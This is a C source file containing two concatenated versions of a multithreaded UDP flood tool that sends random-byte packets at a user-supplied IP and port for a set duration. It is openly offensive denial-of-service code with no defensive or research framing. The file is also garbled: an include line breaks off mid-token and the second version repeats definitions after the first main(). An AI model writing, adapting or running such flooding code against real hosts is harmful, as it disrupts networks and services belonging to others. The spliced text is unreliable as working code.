#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>
#include <sys/sysinfo.h>

#define PAYLOAD_SIZE 1024  // Optimized payload size
#define RATE_LIMIT 5000    // Max packets per second per thread

typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

// Function to create a non-blocking UDP socket
int create_socket() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    int sndbuf = 2 * 1024 * 1024; // 2MB buffer for high-speed sending
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    return sock;
}

// UDP flood function with enhanced rate control
void *udp_flood(void *params) {
    AttackParams *attack = (AttackParams *)params;
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(attack->port);
    inet_pton(AF_INET, attack->ip, &target.sin_addr);

    int sock = create_socket();
    if (sock < 0) return NULL;

    char packet[PAYLOAD_SIZE];
    unsigned int seed = time(NULL) ^ pthread_self();

    struct timespec start_time, end_time;
    double elapsed_time;
    int packets_sent = 0;

    time_t start = time(NULL);
    while (time(NULL) - start < attack->duration) {
        for (int i = 0; i < PAYLOAD_SIZE; i++) {
            packet[i] = (char)(rand_r(&seed) % 256);
        }

        clock_gettime(CLOCK_MONOTONIC, &start_time);
        sendto(sock, packet, PAYLOAD_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
        packets_sent++;

        clock_gettime(CLOCK_MONOTONIC, &end_time);
        elapsed_time = (end_time.tv_sec - start_time.tv_sec) + (end_time.tv_nsec - start_time.tv_nsec) / 1e9;
        if (elapsed_time < 1.0 / RATE_LIMIT) {
            usleep((1.0 / RATE_LIMIT - elapsed_time) * 1e6);
        }
    }

    printf("[Thread %ld] Packets sent: %d\n", pthread_self(), packets_sent);
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 4 || argc > 5) {
        printf("Usage: %s <IP> <Port> <Duration> [Threads]\n", argv[0]);
        return EXIT_FAILURE;
    }

    AttackParams attack;
    strncpy(attack.ip, argv[1], 15);
    attack.port = atoi(argv[2]);
    attack.duration = atoi(argv[3]);

    int thread_count = (argc == 5) ? atoi(argv[4]) : get_nprocs();
    if (thread_count <= 0) thread_count = get_nprocs(); // Fallback to CPU cores if invalid

    printf("Using %d threads for UDP flood.\n", thread_count);

    pthread_t threads[thread_count];
    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, udp_flood, &attack);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("UDP flood attack completed.\n");
    return EXIT_SUCCESS;
}


#define MAX_THREADS 10    // Controlled thread count for stability
#define PAYLOAD_SIZE 1024 // Packet size in bytes
#define RATE_LIMIT 10000  // Max packets per second per thread

typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

// Function to create a non-blocking UDP socket
int create_socket() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Set socket to non-blocking mode
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    // Increase send buffer size for better performance
    int sndbuf = 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    return sock;
}

// Function to send UDP packets with random bytes
void *udp_flood(void *args) {
    AttackParams *params = (AttackParams *)args;
    struct sockaddr_in target;
    char payload[PAYLOAD_SIZE];

    int sock = create_socket();
    if (sock < 0) {
        pthread_exit(NULL);
    }

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(params->port);
    inet_pton(AF_INET, params->ip, &target.sin_addr);

    srand(time(NULL)); // Seed random generator

    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time) {
        // Generate random bytes
        for (int i = 0; i < PAYLOAD_SIZE; i++) {
            payload[i] = rand() % 256;
        }

        // Send UDP packet
        sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr *)&target, sizeof(target));

        usleep(1000000 / RATE_LIMIT); // Rate limiting
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <IP> <Port> <Duration>\n", argv[0]);
        return EXIT_FAILURE;
    }

    AttackParams params;
    strncpy(params.ip, argv[1], 15);
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);

    pthread_t threads[MAX_THREADS];

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_create(&threads[i], NULL, udp_flood, &params);
    }

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("UDP flood attack completed.\n");
    return EXIT_SUCCESS;
}
